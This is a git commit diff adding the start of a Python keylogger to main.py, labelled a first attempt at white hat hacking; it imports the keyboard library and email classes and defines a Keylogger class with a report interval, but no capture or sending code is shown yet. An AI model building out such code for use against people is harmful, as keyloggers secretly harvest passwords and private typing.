cd3bc44c8d9bae367736027b1ee8399cdf3e5da0
Macapps13 <ben.alvaro@icloud.com>
2024-05-04 16:49:37 +1000

    modified:   main.py

--- main.py
+++ main.py
@@ -1,3 +1,21 @@
-#First Attempt at White Hat Hacking/Cyberscurity Programming
+# First Attempt at White Hat Hacking/Cyberscurity Programming
+# By Ben Alvaro 
+# 03/05/2024
 
+import keyboard #for logging
+from threading import Timer
+from datetime import datetime
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
+SEND_REPORT_EVER =  60
+
+class Keylogger:
+    def __init__(self, interval, report_method="file"):
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+        
